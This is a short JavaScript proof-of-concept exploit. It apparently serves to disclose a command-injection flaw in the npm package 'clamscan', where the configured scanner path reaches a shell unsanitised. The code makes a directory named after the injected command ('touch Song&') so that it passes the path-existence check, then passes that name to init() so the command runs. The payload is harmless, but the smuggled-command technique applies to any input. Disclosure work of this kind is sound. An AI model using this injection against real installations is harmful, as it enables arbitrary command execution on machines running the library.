/**
 * this is a so called "not perfect attack"
 * which means to bypass the condition checking in line 493 of file "index.js",
 * we need to generate a dir or a file with the name of the attack code
 * for example, in the attacking code, we need to generate a file named "touch Song &"
 * to do the attack.
 *
 * The injection point is located in line 495 of file "index.js", there is no sanitaion
 */

var Root = require("clamscan");
var fs = require("fs");
var attack_code = "touch Song";
var root = new Root();
fs.mkdir(attack_code + "&", function(){});
root.init({"clamscan": {'path': attack_code + "&"}});

